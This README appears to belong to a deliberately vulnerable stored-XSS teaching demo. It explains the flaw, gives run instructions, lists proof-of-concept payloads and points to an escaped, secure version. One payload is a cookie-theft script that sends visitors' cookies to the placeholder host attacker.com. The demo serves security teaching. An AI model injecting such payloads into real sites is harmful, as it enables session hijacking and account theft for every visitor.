# Stored XSS - Vulnerable Demo

## What is Stored XSS?
Stored Cross-Site Scripting (XSS) occurs when malicious scripts are
saved in a database and executed every time a user visits the affected page.
Unlike Reflected XSS, this attack is persistent and affects ALL visitors.

## How to Run
```bash
cd vulnerable/xss_stored
python app.py
```
Then open http://127.0.0.1:5003

## Exploitation - Proof of Concept

### Basic Alert
Post this as a comment:
```
<script>alert('XSS!')</script>
```

### Page Defacement
```
<script>document.body.style.background='red'</script>
```

### Cookie Theft (Realistic Attack)
```
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

## Why is this Dangerous?
- Script executes for EVERY visitor, not just the attacker
- Can steal session cookies and hijack accounts
- Can redirect users to phishing pages
- Can deface the entire website

## Mitigation
See `/secure/xss_stored/` which uses:
- `html.escape()` to sanitize input before storing
- Jinja2 auto-escaping (no `| safe` filter) when rendering
```

